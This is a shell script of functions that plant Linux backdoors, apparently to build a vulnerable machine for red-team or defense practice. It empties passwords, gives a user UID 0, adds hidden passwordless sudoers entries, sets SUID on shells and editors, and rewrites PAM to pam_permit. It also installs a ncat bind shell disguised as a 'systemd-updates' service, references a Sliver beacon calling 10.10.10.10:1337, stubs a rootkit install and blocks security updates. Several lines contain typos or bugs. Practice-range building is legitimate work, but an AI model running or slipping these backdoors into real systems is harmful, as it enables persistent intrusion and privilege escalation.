#!/bin/sh

RANDOM=$$$(date +%s)

#############
#   USERS   #
#############

noPasswd() {
  sed -i "s/jotaro:x/jotaro:/" /etc/passwd
}
sudoGroup() {
  if grep -q wheel /etc/group; then
    usermod -G wheel jolyne
  else
    usermod -G sudo jolyne
  fi
}
sshKey() {
  mkdir /home/jolyne
  mkdir /home/jolyne/.ssh
  cp -f assets/authorized_keys /home/jolyne/.ssh/authorized_keys
}
uidRoot() {
  sed -i "s/joseph:x:[^:]*:/joseph:x:0:/" /etc/passwd
}

admUser() {
  useradd jonathan
  usermod -g joestar jonathan
  usermod -G adm jonathan
}
dialUser() {
  useradd josuke
  usermod -g joestar josuke
  usermod -G dialout josuke
}
typoUser() {
  cp -f /bin/sh /usr/bin/nologin
  useradd kernpoops
  usermod -s "/usr/bin/nologin" kernpoops
}
noShadow() {
  cp -f "/bin/sh" "/bin/false"
  sed -i "s/sys:\*:/sys::/" /etc/shadow
  usermod -s "/bin/false" sys
}

###################
#   PERMISSIONS   #
###################

aclPasswd() {
  for u in $(cat /etc/passwd | cut -d ":" -f1); do
    setfacl -m u:$u:rwx /etc/passwd
  done
}
aclShadow() {
  for u in $(cat /etc/passwd | cut -d ":" -f1); do
    setfacl -m u:$u:rwx /etc/passwd
  done
}
capCat() {
  f="/bin/cat"
  if [ -f $f ]; then
    setcap capa_dac_override=eip $f
  fi
}
capVim() {
  f="/usr/bin/vim.basic"
  if [ -f $f ]; then
    setcap capa_dac_override=eip $f
  fi
}
capLess() {
  f="$(which less)"
  if [ -f $f ]; then
    setcap capa_dac_override=eip $f
  fi
}
bashCopy() {
  randVar=$(cat /dev/urandom | head -c 6 | base64 -w0 | tr -d "+" | tr -d "/")
  randVar="xkcd$randVar"
  if [ -f /bin/bash ]; then
    cp -f /bin/bash /bin/$randVar
    chmod u+s /bin/bash /bin/$randVar
  fi
}
zshSUID() {
  f="/bin/zsh"
  if [ -f $f ]; then
    chmod u+s $f
  fi
}
fishSUID() {
  f="/bin/fish"
  if [ -f $f ]; then
    chmod u+s $f
  fi
}
falseSUID() {
  f="/bin/false"
  if [ -f $f ]; then
    chmod u+s $f
  fi
}
vimSUID() {
  f="/usr/bin/vim"
  if [ -f $f ]; then
    chmod u+s $f
  fi
}
catSUID() {
  f="/bin/cat"
  if [ -f $f ]; then
    chmod u+s $f
  fi
}

##############
#   SYSTEM   #
##############

sudoAll() {
  for u in $(cat /etc/passwd | awk -F: '{print $1}'); do
    usermod -a -G sudo $u
  done
}
fakeSudod() {
  randomVal=$((RANDOM % 3))
  case $randomVal in
    0)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" ";;
    1)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  ";;
    2)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/README
  esac
 
}
vimSudo() {
  if [ -f /usr/bin/vim ]; then
    echo "%sudo ALL=(ALL:ALL) NOPASSWD:/usr/bin/vim" >> /etc/sudoers
  fi
}
sudoUser() {
  echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
}
pamCommonAuth() {
  if [ -f /etc/pam.d/common-auth ]; then
    sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
    sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
    sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth
  fi
}
pamSu() {
  if [ -f /etc/pam.d/su ]; then
    sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su
  fi
}
pamPermit() {
  if [ -f "/lib/x86_64-linux-gnu/security/pam_permit.so" ]; then
    pam_path="/lib/x86_64-linux-gnu/security"
  else
    pam_path="/lib/i386-linux-gnu/security"
  fi
  cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so
}

#################
#   PROCESSES   #
#################

# root runs a writeable script 
cronScript() {
  mkdir -p /home/jolyne/Documents
  echo "tar czvf jolyne_docs.tar.gz /home/jolyne/Documents/" > /home/jolyne/backup.sh
  chmod 777 /home/jolyne/backup.sh
  echo "* * * * * /home/jolyne/backsup.sh" | crontab -
}

# nc bind shell: "systemd-updates" spoof + malicious service on port 143
bindShell() {
  apt install ncat -y
  cp $(which ncat) /usr/bin/systemd-updates
  
  cat <<EOF > /usr/lib/systemd/system/systemd-updates.service
[Unit]
Description=Unattended System Updates
After=network.target

[Service]
ExecStart=/usr/bin/systemd-updates -lvnp 143 -e /bin/bash
ExecReload=/bin/kill -TERM $MAINPID
Type=simple
Restart=on-failure
RestartSec=2
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

  systemctl daemon-reload
  systemctl restart systemd-updates
}

# kool_beacons.sh was created with the following command:
# generate beacon --mtls 10.10.10.10:1337 --os linux --arch amd64 --format shell --save . --seconds 5 --jitter 1 --name kool_beacon.sh
sliver() {
  ../assets/kool_beans.sh
}

aptPin() {
cat <<EOF > /etc/apt/preferences.d/ubuntu-pro-esm-security
Package: *
Pin: release *
Pin-Priority: -1
EOF

chattr +i /etc/apt/preferences.d/ubuntu-pro-esm-security
}

# --- IN CONSTRUCTION ---
# bdsRootkit() {
#   git clone https://github.com/bluedragonsecurity/bds_lkm.git
#  cd bds_lkm && ./install.sh
#}


$1